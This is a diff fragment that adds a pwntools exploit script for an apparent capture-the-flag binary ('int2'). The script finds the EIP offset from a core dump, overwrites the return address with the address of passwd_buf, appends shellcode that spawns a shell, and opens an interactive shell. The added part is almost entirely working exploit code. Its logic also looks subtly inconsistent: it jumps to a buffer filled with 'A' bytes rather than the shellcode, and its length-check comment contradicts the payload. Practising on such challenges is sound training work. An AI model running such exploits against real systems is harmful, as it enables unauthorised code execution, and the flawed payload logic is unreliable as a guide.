@@ -109,3 +109,64 @@
  '**Note:** Adjust the paths and filenames according to your environment. '
  'Ensure that core dumps are enabled (`ulimit -c unlimited`) to generate the '
  'core file needed for finding the EIP offset.')
+
+from pwn import *
+
+# Set up pwntools for the correct architecture
+context.update(arch='i386', os='linux')
+
+# Load the binary
+binary_path = './pwn/integer/int-2/int2'
+elf = ELF(binary_path)
+
+# Start the process
+p = process(binary_path)
+
+# Find the address of passwd_buf
+passwd_buf = elf.symbols['passwd_buf']
+log.info(f"passwd_buf address: {hex(passwd_buf)}")
+
+# Generate shellcode to spawn a shell
+shellcode = asm(shellcraft.sh())
+
+# Send the initial prompts
+p.recvuntil(b'Plz input your passwd:\n')
+
+# We'll use a cyclic pattern to find the exact offset to EIP
+payload = cyclic(100)
+
+# Send the payload
+p.sendline(payload)
+
+# Wait for the process to crash
+p.wait()
+
+# Open the core dump
+core = Coredump('./core')
+
+# Find the offset to EIP
+eip_offset = cyclic_find(core.eip)
+log.info(f"EIP offset is at {eip_offset} bytes")
+
+# Now construct the real payload
+# We need to have input length between 4 and 8 to pass the length check
+prefix_length = 8  # Maximum length to pass the check
+prefix = b'A' * prefix_length
+
+# Calculate padding to reach EIP overwrite
+padding_length = eip_offset - prefix_length
+padding = b'B' * padding_length
+
+# Overwrite EIP with the address of passwd_buf
+ret_address = p32(passwd_buf)
+
+# Final payload
+payload = prefix + padding + ret_address + shellcode
+
+# Restart the process
+p = process(binary_path)
+p.recvuntil(b'Plz input your passwd:\n')
+p.sendline(payload)
+
+# Give us an interactive shell
+p.interactive()
